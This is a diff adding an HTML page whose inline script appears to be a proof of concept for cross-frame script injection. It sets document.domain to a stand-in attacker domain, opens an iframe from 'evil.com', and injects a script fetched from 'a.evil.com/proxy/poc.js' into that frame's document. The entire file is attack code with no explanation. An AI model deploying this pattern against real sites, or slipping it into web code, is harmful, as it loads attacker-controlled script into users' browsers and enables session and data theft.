@@ -1,0 +1,35 @@
+﻿<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<body></body>
+
+<script>
+document.domain="evil.com";
+
+function inj_iframe(src,onload){
+  /*注入框架*/
+  var o = document.createElement("iframe");
+  o.src = src;
+  o.width = o.height = 300;
+  o.id="proxy";
+  if(onload) o.onload = onload;
+  document.getElementsByTagName("body")[0].appendChild(o);
+  return o;
+}
+
+function inject(){
+	var d = document.getElementById("proxy").contentDocument || document.getElementById("proxy").contentWindow.document
+	//d.write('123');
+	var x = d.createElement("SCRIPT");
+	x.src ="http://a.evil.com/proxy/poc.js"; 
+	x.defer = true;
+	d.getElementsByTagName("HEAD")[0].appendChild(x);
+
+}
+
+var o = inj_iframe("http://evil.com/proxy/proxy.htm",inject);
+
+</script>
+
+</html>
